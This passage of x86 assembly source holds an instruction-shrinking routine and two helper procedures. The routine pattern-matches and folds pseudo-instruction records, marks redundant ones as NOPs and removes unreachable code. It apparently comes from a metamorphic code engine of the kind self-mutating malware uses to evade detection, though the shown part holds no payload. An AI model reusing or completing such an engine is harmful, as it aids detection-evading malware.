                mov     eax, [edi+1]
                mov     [esi+2], eax
                xor     eax, eax
                mov     [esi+3], eax    
                mov     eax, 0FCh       
                jmp   @@Double_Next_SetInstruction
        @@Double_Next07_LEA01:
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     ebx, [edi+1]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next08
                mov     eax, [edi+7]  
                mov     [esi+3], eax  
                jmp   @@Double_Next06_SetLEA

      @@Double_Next08:
                mov     eax, [esi]
                and     eax, 0FFh
                or      eax, eax      
                jnz   @@Double_Next09
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 01h      
                jnz   @@Double_Next09
                mov     eax, [esi+1]
                and     eax, 0FFh
                mov     ebx, [edi+7]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next09
                mov     eax, [edi+1]
                mov     [esi+2], eax
                mov     eax, [esi+7]
                mov     [esi+3], eax
                mov     eax, [esi+1]
                mov     [esi+7], eax
                mov     eax, 0FCh     
                jmp   @@Double_Next_SetInstruction

      @@Double_Next09:
                mov     eax, [esi]
                and     eax, 0FFh
                cmp     eax, 01h      
                jnz   @@Double_Next10
                mov     eax, [edi]
                and     eax, 0FFh
                or      eax, eax      
                jnz   @@Double_Next10
                mov     eax, [esi+7]
                cmp     al, [edi+1]
                jnz   @@Double_Next10
                mov     eax, [esi+1]
                mov     [esi+2], al
                mov     eax, [esi+7]
                mov     [esi+1], al
                mov     eax, [edi+7]
                mov     [esi+3], eax
                mov     eax, 0FCh     
                jmp   @@Double_Next_SetInstruction

      @@Double_Next10:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 4Ch      
                ja    @@Double_Next11
                mov     al, [edi]
                cmp     eax, 4Ch      
                ja    @@Double_Next11
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 4        
                jz    @@Double_Next10_OPMemImm
                or      eax, eax      
                jnz   @@Double_Next11
        @@Double_Next10_OPRegImm:
                mov     eax, [edi]
                and     eax, 7
                or      eax, eax      
                jnz   @@Double_Next11
                mov     eax, [esi+1]
                cmp     al, [edi+1]   
                jnz   @@Double_Next11
                xor     ebx, ebx
        @@Double_Next_CalculateOperation:
                push    ebx
                mov     ecx, [esi+7]
                mov     edx, [edi+7]
        @@Double_Next_CalculateOperation_2:
                mov     eax, [edi]
                and     eax, 78h      
                mov     ebx, eax
                mov     eax, [esi]
                and     eax, 78h      
                call    CalculateOperation 
                pop     ebx
                cmp     eax, 0FEh     
                jz    @@Double_End    
                cmp     eax, 0FFh     
                jz    @@Double_Next_SetNOPAt1st 
                mov     [esi+7], ecx
                add     eax, ebx      
                jmp   @@Double_Next_SetInstruction
        @@Double_Next_SetNOPAt1st:
                mov     eax, 0FFh     
                mov     [esi], al
                jmp   @@EndCompressed 
        @@Double_Next10_OPMemImm:
                mov     eax, [edi]
                and     eax, 7
                cmp     eax, 4        
                jnz   @@Double_Next11
                mov     eax, [esi+1]
                cmp     eax, [edi+1]  
                jnz   @@Double_Next11
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next11
                mov     ebx, 4        
                jmp   @@Double_Next_CalculateOperation

      @@Double_Next11:
                xor     eax, eax
                mov     al, [esi]     
                cmp     eax, 00h+80h  
                jb    @@Double_Next12
                cmp     eax, 4Ch+80h
                ja    @@Double_Next12
                mov     al, [edi]
                cmp     eax, 00h+80h
                jb    @@Double_Next12
                cmp     eax, 4Ch+80h
                ja    @@Double_Next12
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 4
                jz    @@Double_Next11_OPMemImm_8b
                or      eax, eax
                jnz   @@Double_Next12
        @@Double_Next11_OPRegImm_8b:
                mov     eax, [edi]
                and     eax, 7
                or      eax, eax
                jnz   @@Double_Next12
                mov     ebx, 80h
        @@Double_Next11_CalculateOperation_8b:
                push    ebx
                xor     eax, eax
                mov     al, [esi+7]
                mov     ecx, eax
                mov     al, [edi+7]
                mov     edx, eax
                jmp   @@Double_Next_CalculateOperation_2
        @@Double_Next11_OPMemImm_8b:
                mov     eax, [edi]
                and     eax, 7
                cmp     eax, 4
                jnz   @@Double_Next12
                mov     eax, [esi+1]
                cmp     eax, [edi+1]
                jnz   @@Double_Next12
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next12
                mov     ebx, 84h
                jmp   @@Double_Next11_CalculateOperation_8b

      @@Double_Next12:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 0FCh     
                jnz   @@Double_Next13
                mov     al, [edi]
                cmp     eax, 01h      
                jz    @@Double_Next12_MergeLEAADDReg
                or      eax, eax      
                jnz   @@Double_Next13
        @@Double_Next12_MergeLEAADD:
                mov     eax, [esi+7]  
                cmp     al, [edi+1]   
                jnz   @@Double_Next13
                mov     eax, [edi+7]  
                add     [esi+3], eax  
                jmp   @@Double_Next_SetNOP 
        @@Double_Next12_MergeLEAADDReg:
                mov     eax, [esi+7]
                cmp     al, [edi+7]   
                jnz   @@Double_Next13
                mov     eax, 8
                cmp     al, [esi+1]   
                jz    @@Double_Next12_SetFirstReg 
                cmp     al, [esi+2]               
                jz    @@Double_Next12_SetSecondReg
                mov     eax, [edi+1]  
                cmp     al, [esi+2]   
                jz    @@Double_Next12_AddScalar
                cmp     al, [esi+1]
                jnz   @@Double_Next13
                mov     eax, [esi+2]
                cmp     al, 40h       
                jae   @@Double_Next13 
                push    eax           
                mov     eax, [esi+1]  
                add     eax, 40h      
                mov     [esi+2], al   
                pop     eax
                mov     [esi+1], al
                jmp   @@Double_Next_SetNOP 
        @@Double_Next12_AddScalar:
                mov     eax, [esi+2]  
                add     eax, 40h
                mov     [esi+2], al
                jmp   @@Double_Next_SetNOP
        @@Double_Next12_SetFirstReg:
                mov     eax, [edi+1] 
                mov     [esi+1], al
                jmp   @@Double_Next_SetNOP
        @@Double_Next12_SetSecondReg:
                mov     eax, [edi+1] 
                mov     [esi+2], al
                jmp   @@Double_Next_SetNOP

      @@Double_Next13:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 4Fh     
                jnz   @@Double_Next14
                mov     al, [edi]
                cmp     eax, 4Fh     
                jz    @@Double_Next13_MergeMOVs 
                cmp     eax, 4Ch
                ja    @@Double_Next13_NotOPRegMem
        @@Double_Next13_OPRegMem_2:
                and     eax, 7
                cmp     eax, 2       
                jz    @@Double_Next13_OPRegMem
                mov     al, [edi]
                jmp   @@Double_Next13_NotOPRegMem2
        @@Double_Next13_NotOPRegMem:
                cmp     eax, 00h+80h 
                jb    @@Double_Next13_NotOPRegMem2
                cmp     eax, 4Ch+80h
                jbe   @@Double_Next13_OPRegMem_2
        @@Double_Next13_NotOPRegMem2:
                cmp     eax, 43h     
                jz    @@Double_Next13_MOVMemReg
                cmp     eax, 0F6h    
                jz    @@Double_Next13_MOVMemReg
                cmp     eax, 44h     
                jz    @@Double_Next13_MOVMemImm
                cmp     eax, 0EAh    
                jz    @@Double_Next13_CALLMem
                cmp     eax, 0EBh    
                jnz   @@Double_Next14
        @@Double_Next13_JMPMem:
        @@Double_Next13_CALLMem:
        @@Double_Next13_OPRegMem:
                mov     ebx, [esi+7]  
                mov     eax, [ebx+1]
                cmp     eax, [edi+1]
                jnz   @@Double_Next14
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next14
                mov     eax, [esi+1]
                mov     [edi+1], eax
                mov     eax, [esi+3]
                mov     [edi+3], eax
                jmp   @@Double_Next_SetNOPAt1st
        @@Double_Next13_MergeMOVs:
                mov     ebx, [esi+7] 
                mov     eax, [ebx+1] 
                cmp     eax, [edi+1]
                jnz   @@Double_Next14
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jnz   @@Double_Next14
                mov     eax, [edi+7]
                mov     [esi+7], eax
                mov     [eax+7], esi
                jmp   @@Double_Next_SetNOP
        @@Double_Next13_MOVMemReg:
        @@Double_Next13_MOVMemImm:
                mov     ebx, [esi+7]  
                mov     eax, [ebx+1]  
                cmp     eax, [edi+1]
                jnz   @@Double_Next14
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jz    @@Double_Next_SetNOPAt1st

      @@Double_Next14:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 70h     
                jb    @@Double_Next15
                cmp     eax, 7Fh
                ja    @@Double_Next15
                mov     al, [edi]
                cmp     eax, 0E9h    
                jz    @@Double_Next14_CheckJMP
                cmp     eax, 70h
                jb    @@Double_Next15
                cmp     eax, 7Fh     
                ja    @@Double_Next15
                mov     eax, [edi+1] 
                cmp     eax, [esi+1] 
                jnz   @@Double_Next15
                mov     eax, [esi]
                and     eax, 0Fh
                mov     ebx, eax
                mov     eax, [edi]
                and     eax, 0Fh
                
                
                call    GetRealCheck 
                cmp     eax, 0FFh
                jz    @@Double_End
                add     eax, 70h     
                cmp     eax, 0E9h    
                jz    @@Double_Next32_JMP 
                                          
                jmp   @@Double_Next_SetInstruction
      @@Double_Next14_CheckJMP:
                mov     eax, [edi+1] 
                cmp     eax, [esi+1]
                jz    @@Double_Next_SetNOPAt1st
                jmp   @@Double_End

      @@Double_Next15:
      @@Double_Next16:
      @@Double_Next17:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 0E0h    
                jnz   @@Double_Next18
                mov     ebx, 0E4h    
                xor     ecx, ecx
                mov     edx, 1       
        @@Double_Next_Check_NOT_OP:
                xor     eax, eax
                mov     al, [edi]
                cmp     eax, ebx 
                jz    @@Double_Next17_ADDReg 
                cmp     eax, ecx 
                jnz   @@Double_End
        @@Double_Next17_NEGReg:
                mov     eax, [esi+1]
                cmp     al, [edi+1]
                jnz   @@Double_End
        @@Double_Next17_NEGReg_2:
                test    ebx, 2
                jz    @@Double_Next17_Get32
                xor     eax, eax
                mov     al, [edi+7]
                cmp     eax, 80h
                jb    @@Double_Next17_Cont00
                add     eax, 0FFFFFF00h
                jmp   @@Double_Next17_Cont00
        @@Double_Next17_Get32:
                mov     eax, [edi+7]
        @@Double_Next17_Cont00:
                cmp     eax, edx
                jnz   @@Double_End
                mov     eax, ebx  
                jmp   @@Double_Next_SetInstruction
        @@Double_Next17_ADDReg:
                mov     eax, [esi+1]
                cmp     al, [edi+1]
                jnz   @@Double_End
        @@Double_Next17_ADDReg_2:
                mov     eax, edx
                mov     [esi+7], eax
                mov     eax, ecx
                jmp   @@Double_Next_SetInstruction

      @@Double_Next18:                
                cmp     eax, 0E2h  
                jnz   @@Double_Next19
                mov     ebx, 0E6h
                mov     ecx, 80h
                mov     edx, 1     
                jmp   @@Double_Next_Check_NOT_OP

      @@Double_Next19:                
                cmp     eax, 0E4h  
                jnz   @@Double_Next20
                mov     ebx, 0E0h
                xor     ecx, ecx
                mov     edx, -1    
                jmp   @@Double_Next_Check_NOT_OP

      @@Double_Next20:                
                cmp     eax, 0E6h  
                jnz   @@Double_Next21
                mov     ebx, 0E2h
                mov     ecx, 80h
                mov     edx, -1    
                jmp   @@Double_Next_Check_NOT_OP

      @@Double_Next21:
                cmp     eax, 0E1h  
                jnz   @@Double_Next22
                mov     ebx, 0E5h
                mov     ecx, 4
                mov     edx, 1     
        @@Double_Next_Check_NOT_OP_Mem:
                xor     eax, eax
                mov     al, [edi]
                cmp     eax, ebx
                jz    @@Double_Next21_ADDMem
                cmp     eax, ecx
                jnz   @@Double_End
        @@Double_Next21_NEGMem:
                mov     eax, [esi+1] 
                cmp     eax, [edi+1]
                jnz   @@Double_End
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_End
                xor     eax, eax
                jmp   @@Double_Next17_NEGReg_2
        @@Double_Next21_ADDMem:
                mov     eax, [esi+1]  
                cmp     eax, [edi+1]
                jnz   @@Double_End
                mov     eax, [esi+3]
                cmp     eax, [edi+3]
                jnz   @@Double_End
                xor     eax, eax
                jmp   @@Double_Next17_ADDReg_2

      @@Double_Next22:
                cmp     eax, 0E3h     
                jnz   @@Double_Next23
                mov     ebx, 0E7h
                mov     ecx, 84h
                mov     edx, 1        
                jmp   @@Double_Next_Check_NOT_OP_Mem

      @@Double_Next23:
                cmp     eax, 0E5h     
                jnz   @@Double_Next24
                mov     ebx, 0E1h
                mov     ecx, 4
                mov     edx, -1       
                jmp   @@Double_Next_Check_NOT_OP_Mem

      @@Double_Next24:
                cmp     eax, 0E7h     
                jnz   @@Double_Next25
                mov     ebx, 0E3h
                mov     ecx, 84h
                mov     edx, -1       
                jmp   @@Double_Next_Check_NOT_OP_Mem

      @@Double_Next25:
      @@Double_Next26:
      @@Double_Next27:
      @@Double_Next28:
      @@Double_Next29:
                cmp     eax, 0EAh   
                jnz   @@Double_Next30
        @@Double_Next29_CheckAPICALL_STORE:
                mov     al, [edi]
                cmp     eax, 43h
                jnz   @@Double_End
                mov     al, [edi+7] 
                or      eax, eax
                jnz   @@Double_End
                mov     eax, 0F6h
                mov     [edi], al   
                xor     eax, eax
                mov     [edi+7], eax  
                jmp   @@EndCompressed 

      @@Double_Next30:
                cmp     eax, 0ECh   
                jz    @@Double_Next29_CheckAPICALL_STORE 

      @@Double_Next31:
                cmp     eax, 42h    
                jnz   @@Double_Next32
                mov     eax, [edi]
                and     eax, 0FFh
                cmp     eax, 20h    
                jz    @@Double_Next31_MaybeMOVZX 
                mov     al, [esi+7]
                cmp     eax, 2      
                ja    @@Double_Next32
                cmp     al, [edi+1]
                jnz   @@Double_Next32
                mov     al, [edi]
                cmp     eax, 0ECh   
                jnz   @@Double_Next32
                sub     eax, 2      
                jmp   @@Double_Next_SetInstruction
      @@Double_Next31_MaybeMOVZX:
                mov     eax, [edi+7] 
                cmp     eax, 0FFh    
                jnz   @@Double_Next32
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     ebx, [edi+1]
                and     ebx, 0FFh
                cmp     eax, ebx
                jnz   @@Double_Next32
                mov     eax, [esi+1]
                and     eax, 0FFh    
                cmp     eax, ebx
                jz    @@Double_Next32
                mov     eax, [esi+2]
                and     eax, 0Fh     
                cmp     eax, ebx
                jz    @@Double_Next32
                mov     eax, 0F8h    
                jmp   @@Double_Next_SetInstruction


      @@Double_Next32:
                xor     eax, eax
                mov     al, [esi]
                cmp     eax, 39h     
                jnz   @@Double_Next33
        @@Double_Next32_Common:
                mov     al, [edi]
                cmp     eax, 70h     
                jb    @@Double_End
                cmp     eax, 7Fh
                ja    @@Double_End
                mov     al, [esi+1]
                mov     ebx, eax     
                mov     al, [esi+7]  
                cmp     eax, ebx
                jnz   @@Double_End

                mov     eax, [edi]   
                and     eax, 07h     
                cmp     eax, 1       
                jz    @@Double_Next32_JMP
                cmp     eax, 6
                jz    @@Double_Next32_JMP
                mov     eax, [edi]
                and     eax, 0Fh
                cmp     eax, 2
                jbe   @@Double_Next32_NOP
                cmp     eax, 4
                jbe   @@Double_Next32_JMP
                cmp     eax, 0Ah
                jz    @@Double_Next32_JMP
                cmp     eax, 0Dh
                jz    @@Double_Next32_JMP
        @@Double_Next32_NOP:
                mov     eax, 0FFh   
                mov     [edi], eax
                jmp   @@EndCompressed
        @@Double_Next32_JMP:
                mov     eax, 0E9h   
                mov     [edi], al
                mov     edx, edi
 
        @@Double_Next32_EliminateNonReachableCode:
                add     edx, 10h
                cmp     edx, [ebp+AddressOfLastInstruction]
                jae   @@EndCompressed
                mov     al, [edx+0Bh]  
                or      eax, eax
                jnz   @@EndCompressed
                mov     eax, 0FFh
                mov     [edx], eax
                jmp   @@Double_Next32_EliminateNonReachableCode


      @@Double_Next33:
                cmp     eax, 39h+80h   
                jz    @@Double_Next32_Common

      @@Double_End:


      @@Check_Triple:
                mov     edx, esi
                mov     esi, edi
                call    IncreaseEIP
                cmp     edi, [ebp+AddressOfLastInstruction]
                jz    @@EndNoCompressed
                xor     eax, eax
                mov     al, [edi+0Bh]
                or      eax, eax
                jnz   @@EndNoCompressed                                                         

      @@Triple_Next00:                
                mov     al, [edx]
                cmp     eax, 43h       
                jnz   @@Triple_Next01
                mov     eax, [edx+1]  
                cmp     eax, [esi+1]
                jnz   @@Triple_Next01
                mov     eax, [edx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_Next01
                mov     eax, [edi]
                cmp     al, 42h        
                jz    @@Triple_Next00_Constr00
                cmp     al, 70h        
                jb    @@Triple_Next01
                cmp     al, 7Fh
                ja    @@Triple_Next01
                mov     eax, [esi]
                and     eax, 0F8h      
                or      eax, eax
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 28h       
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 38h       
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 48h       
                jz    @@Triple_Next00_Maybe01
                cmp     eax, 20h       
                jnz   @@Triple_End
        @@Triple_Next00_Maybe01:
                xor     ebx, ebx
        @@Triple_Next00_CheckCMPTEST:
                mov     eax, [esi]     
                and     eax, 07Fh
                cmp     eax, 48h       
                jb    @@Triple_Next00_CheckCMPTEST_00
                and     eax, 7
                cmp     eax, 2         
                jz    @@Triple_Next00_CMPTESTRegReg
                jmp   @@Triple_Next00_CheckCMPTEST_01
        @@Triple_Next00_CheckCMPTEST_00:
                and     eax, 7
                cmp     eax, 3         
                jz    @@Triple_Next00_CMPTESTRegReg
        @@Triple_Next00_CheckCMPTEST_01:
                cmp     eax, 4         
                jnz   @@Triple_End
        @@Triple_Next00_CMPTESTRegImm:
                mov     eax, [edx+7]
                mov     [esi+1], al    
        @@Triple_Next00_SET_CMPTEST:
                mov     eax, [esi]
                and     eax, 78h
                cmp     eax, 48h       
                jz    @@Triple_Next00_SetInstruction
                cmp     eax, 20h       
                jz    @@Triple_Next00_Cont80
                cmp     eax, 38h       
                jz    @@Triple_Next00_SetInstruction
                or      eax, eax       
                jz    @@Triple_Next00_NegateImm  
        @@Triple_Next00_SetCMP:
                mov     eax, 38h       
                jmp   @@Triple_Next00_SetInstruction
        @@Triple_Next00_NegateImm:
                mov     eax, [esi+7]
                neg     eax           
                mov     [esi+7], eax  
                jmp   @@Triple_Next00_SetCMP
        @@Triple_Next00_Cont80:
                mov     eax, 48h      
        @@Triple_Next00_SetInstruction:
                add     eax, ebx
                mov     [esi], al
                mov     eax, 0FFh
                mov     [edx], al
                jmp   @@EndCompressed
        @@Triple_Next00_CMPTESTRegReg:
                mov     eax, [esi]
                and     eax, 78h
                or      eax, eax     
                jz    @@Triple_End   
                mov     eax, [esi+7]
                mov     [esi+1], al
                mov     eax, [edx+7]
                mov     [esi+7], al
                add     ebx, 1
                jmp   @@Triple_Next00_SET_CMPTEST
        @@Triple_Next00_Constr00:
                mov     eax, [esi]
                cmp     al, 4Ch      
                ja    @@Triple_Next01
                xor     ebx, ebx
        @@Triple_Next00_Common:
                mov     eax, [esi]
                and     eax, 78h     
                cmp     eax, 48h     
                jb    @@Triple_Next00_Common_00
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 2       
                jz    @@Triple_Next00_Maybe00
                jmp   @@Triple_Next00_Common_01
        @@Triple_Next00_Common_00:
                mov     eax, [esi]
                and     al, 7
                cmp     al, 3        
                jz    @@Triple_Next00_Maybe00
        @@Triple_Next00_Common_01:
                cmp     al, 4        
                jnz   @@Triple_End
        @@Triple_Next00_Maybe00:
                mov     eax, [edx+1]       
                cmp     eax, [esi+1]       
                jnz   @@Triple_End
                cmp     eax, [edi+1]
                jnz   @@Triple_End
                mov     eax, [edx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                cmp     eax, [edi+3]
                jnz   @@Triple_End
                mov     eax, [edx+7]
                cmp     al, [edi+7]
                jnz   @@Triple_End
                mov     eax, [esi]
                and     eax, 78h
                cmp     eax, 48h           
                jb    @@Triple_Next00_00
                mov     eax, [esi]
                and     eax, 7             
                cmp     eax, 2
                jz    @@Triple_Next00_Maybe_OPRegReg 
                jmp   @@Triple_Next00_01
        @@Triple_Next00_00:
                mov     eax, [esi]
                and     eax, 7             
                cmp     eax, 3
                jz    @@Triple_Next00_Maybe_OPRegReg
        @@Triple_Next00_01:
                mov     eax, [edx+7]
                mov     [edx+1], al
                mov     eax, [esi+7]
                mov     [edx+7], eax
                mov     eax, [esi]
                and     eax, 78h
                add     eax, ebx      
        @@Triple_Next_SetInstruction: 
                mov     [edx], al
        @@Triple_Next_SetNOP:
                mov     eax, 0FFh
                mov     [esi], al
                mov     [edi], al    
                jmp   @@EndCompressed
        @@Triple_Next00_Maybe_OPRegReg:
                mov     eax, [esi+7]
                mov     [edx+1], eax
                mov     eax, [edi+7]
                mov     [edx+7], eax
                mov     eax, [esi]
                and     eax, 0F8h    
                add     eax, 1
                jmp   @@Triple_Next_SetInstruction


      @@Triple_Next01:
                mov     eax, [edx]
                cmp     al, 43h+80h    
                jnz   @@Triple_Next02  
                mov     eax, [edx+1]   
                cmp     eax, [esi+1]   
                jnz   @@Triple_Next02  
                mov     eax, [edx+3]   
                cmp     eax, [esi+3]   
                jnz   @@Triple_Next02  
                mov     eax, [edi]
                cmp     al, 42h+80h
                jz    @@Triple_Next01_Constr00
                cmp     al, 70h
                jb    @@Triple_Next02
                cmp     al, 7Fh
                ja    @@Triple_Next02
                mov     eax, [esi]
                and     eax, 0F8h
                cmp     eax, 00h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 28h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 38h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 48h+80h
                jz    @@Triple_Next01_Maybe01
                cmp     eax, 20h+80h
                jnz   @@Triple_End
        @@Triple_Next01_Maybe01:
                mov     ebx, 80h
                jmp   @@Triple_Next00_CheckCMPTEST
        @@Triple_Next01_Constr00:
                mov     ebx, 80h
                mov     eax, [esi]
                cmp     al, 4Ch+80h
                ja    @@Triple_Next02     
                cmp     al, 00h+80h       
                jae   @@Triple_Next00_Common 

      @@Triple_Next02:
                mov     eax, [edx]
                cmp     al, 4Fh           
                jnz   @@Triple_Next03
                mov     eax, [edi]
                cmp     al, 70h           
                jb    @@Triple_Next02_ContCheck
                cmp     al, 7Fh
                ja    @@Triple_Next02_ContCheck
                mov     ebx, [edx+7]      
                mov     eax, [ebx+1]      
                cmp     eax, [esi+1]      
                jnz   @@Triple_End
                mov     eax, [ebx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                mov     eax, [esi]
                and     eax, 78h          
                cmp     eax, 20h          
                jz    @@Triple_Next02_CheckCMPTESTMemReg
                cmp     eax, 28h          
                jz    @@Triple_Next02_CheckCMPTESTMemReg
                cmp     eax, 38h          
                jz    @@Triple_Next02_CheckCMPTESTMemReg
                cmp     eax, 48h          
                jnz   @@Triple_Next03
        @@Triple_Next02_CheckCMPTESTRegMem:
        @@Triple_Next02_CheckCMPTESTMemReg:
                mov     eax, [edx+1]
                mov     [esi+1], eax
                mov     eax, [edx+3]
                mov     [esi+3], eax
                mov     eax, 0FFh
                mov     [edx], eax
                mov     eax, [esi]
                and     eax, 78h
                cmp     eax, 38h          
                jz    @@EndCompressed
                cmp     eax, 48h          
                jz    @@EndCompressed
                cmp     eax, 20h          
                jz    @@Triple_Next02_SetTEST
                mov     ebx, 10h          
        @@Triple_Next02_ConvertInstruction:
                mov     eax, [esi]        
                add     eax, ebx
                mov     [esi], eax
                jmp   @@EndCompressed
        @@Triple_Next02_SetTEST:
                mov     ebx, 28h          
                jmp   @@Triple_Next02_ConvertInstruction
        @@Triple_Next02_ContCheck:
                cmp     al, 4Fh           
                jnz   @@Triple_Next03     
                mov     eax, [esi]
                cmp     al, 4Ch           
                jbe   @@Triple_Next02_CommonOperation
                cmp     al, 00h+80h       
                jb    @@Triple_Next03
                cmp     al, 4Ch+80h
                ja    @@Triple_Next03
        @@Triple_Next02_CommonOperation:
                cmp     eax, 0F6h         
                jz    @@Triple_Next02_OPMemReg
                and     eax, 78h
                cmp     eax, 48h          
                jb    @@Triple_Next02_00
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 2            
                jz    @@Triple_Next02_OPMemReg
                jmp   @@Triple_Next02_01
        @@Triple_Next02_00:
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 3            
                jz    @@Triple_Next02_OPMemReg
        @@Triple_Next02_01:
                cmp     eax, 4            
                jnz   @@Triple_End
        @@Triple_Next02_OPMemImm:
        @@Triple_Next02_OPMemReg:
                mov     ebx, [edx+7]
                mov     eax, [ebx+1]
                cmp     eax, [edi+1]      
                jnz   @@Triple_End        
                cmp     eax, [esi+1]      
                jnz   @@Triple_End        
                mov     eax, [ebx+3]
                cmp     eax, [edi+3]
                jnz   @@Triple_End
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                mov     ebx, [edi+7]
                mov     eax, [ebx+1]
                cmp     eax, [edx+1]
                jnz   @@Triple_End
                mov     eax, [ebx+3]
                cmp     eax, [edx+3]
                jnz   @@Triple_End
                mov     eax, [edx+1]      
                mov     [esi+1], eax
                mov     eax, [edx+3]
                mov     [esi+3], eax
        @@Triple_Next_SetNOP_1_3:
                mov     eax, 0FFh
                mov     [edx], al
                mov     [edi], al         
                jmp   @@EndCompressed     
                                          
                                          
      @@Triple_Next03:
                mov     eax, [edx]
                cmp     al, 44h           
                jnz   @@Triple_Next04
                mov     eax, [edi]
                cmp     al, 42h           
                jz    @@Triple_Next03_Constr00
                cmp     al, 70h           
                jb    @@Triple_Next04
                cmp     al, 7Fh
                ja    @@Triple_Next04
                mov     eax, [esi]
        @@Triple_Next03_Check_CMP_TEST:
                cmp     al, 3Ah           
                jz    @@Triple_Next03_CMPRegImm
                cmp     al, 4Ah           
                jnz   @@Triple_End
        @@Triple_Next03_CMPRegImm:
        @@Triple_Next03_TESTRegImm:
                mov     eax, [esi]        
                and     eax, 0F8h         
                mov     [edx], al         
                mov     eax, [esi+7]
                mov     [edx+1], al
                mov     eax, 0FFh
                mov     [esi], al
                jmp   @@EndCompressed
        @@Triple_Next03_Constr00:
                mov     eax, [esi]
                cmp     eax, 0F6h         
                jz    @@Triple_Next03_Common_F6
                cmp     al, 4Ch           
                ja    @@Triple_Next04
        @@Triple_Next03_Common:
                and     eax, 78h
                cmp     eax, 48h          
                jb    @@Triple_Next03_00
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 2            
                jz    @@Triple_Next03_Common_F6
                jmp   @@Triple_End
        @@Triple_Next03_00:
                mov     eax, [esi]
                and     eax, 7
                cmp     eax, 3            
                jnz   @@Triple_End
        @@Triple_Next03_Common_F6:
                mov     eax, [edx+1]      
                cmp     eax, [esi+1]      
                jnz   @@Triple_End
                cmp     eax, [edi+1]
                jnz   @@Triple_End
                mov     eax, [edx+3]
                cmp     eax, [esi+3]
                jnz   @@Triple_End
                cmp     eax, [edi+3]
                jnz   @@Triple_End
                mov     eax, [esi+7]
                mov     [edx+1], eax
                mov     eax, [esi]
                and     eax, 0F8h
                jmp   @@Triple_Next_SetInstruction


      @@Triple_Next04:
                mov     eax, [edx]
                cmp     al, 44h+80h    
                jnz   @@Triple__Next04
                mov     eax, [edi]
                cmp     al, 42h+80h
                jz    @@Triple_Next04_Constr00
                cmp     al, 70h
                jb    @@Triple__Next04
                cmp     al, 7Fh
                ja    @@Triple__Next04
                mov     eax, [esi]
                sub     al, 80h
                jmp   @@Triple_Next03_Check_CMP_TEST
        @@Triple_Next04_Constr00:
                mov     eax, [esi]
                cmp     al, 00h+80h
                jb    @@Triple__Next04
                cmp     al, 4Ch+80h
                jbe   @@Triple_Next03_Common

      @@Triple__Next04:


      @@Triple_End:
                jmp   @@EndNoCompressed  
                                         
      @@EndCompressed:                   
                mov     eax, 1
                pop     edi
                ret
      @@EndNoCompressed:
                xor     eax, eax
                pop     edi
                ret
ShrinkThisInstructions endp

OrderRegs       proc
                push    edx
                mov     eax, [edi+1]   
                and     eax, 0FFh
                cmp     eax, 8         
                jnz   @@_Next          
                mov     eax, [edi+2]   
                and     eax, 0FFh
                cmp     eax, 7         
                ja    @@_End           
                
                mov     edx, [edi+1]   
                and     edx, 0FFFFFF00h
                add     eax, edx
                mov     [edi+1], eax
                mov     eax, [edi+2]   
                and     eax, 0FFFFFF00h
                add     eax, 8
                mov     [edi+2], eax
        @@_End: pop     edx            
                ret
                
       @@_Next: mov     eax, [edi+2]   
                mov     edx, [edi+1]
                and     eax, 0FFh
                and     edx, 0FFh
                cmp     eax, edx    
                ja    @@_End
                push    eax
                mov     edx, [edi+2]  
                mov     eax, [edi+1]  
                and     eax, 0FFh
                and     edx, 0FFFFFF00h
                add     eax, edx        
                mov     [edi+2], eax    
                pop     eax
                mov     edx, [edi+1]    
                and     edx, 0FFFFFF00h
                add     eax, edx        
                mov     [edi+1], eax    
                pop     edx
                ret                
OrderRegs       endp

CalculateOperation proc
                and     ebx, 0FFh
                and     eax, 0FFh
                cmp     ebx, 40h   
                jz    @@Eliminate1st
                cmp     eax, 40h   
                jz    @@MOV        
                or      eax, eax   
                jz    @@ADD
                cmp     eax, 8     
                jz    @@OR
                cmp     eax, 20h   
                jz    @@AND
                cmp     eax, 28h   
                jz    @@SUB
                cmp     eax, 30h   
                jz    @@XOR
                cmp     eax, 38h   
                jz    @@Eliminate1st
                cmp     eax, 48h   
                jnz   @@Eliminate1st
                jmp   @@NoCompression
     
     @@ADD:     or      ebx, ebx  
                jz    @@ADD_ADD   
                cmp     ebx, 28h  
                jz    @@ADD_SUB   
                jmp   @@NoCompression  
     
     @@OR:      cmp     ebx, 8    
                jz    @@OR_OR     
                jmp   @@NoCompression  

     @@AND:     cmp     ebx, 20h  
                jz    @@AND_AND   
                jmp   @@NoCompression  

     @@SUB:     or      ebx, ebx  
                jz    @@SUB_ADD
                cmp     ebx, 28h
                jnz   @@NoCompression  
     @@SUB_SUB: neg     ecx       
                sub     ecx, edx  
                xor     eax, eax
                ret
     @@SUB_ADD: sub     edx, ecx  
                mov     ecx, edx
                xor     eax, eax
                ret

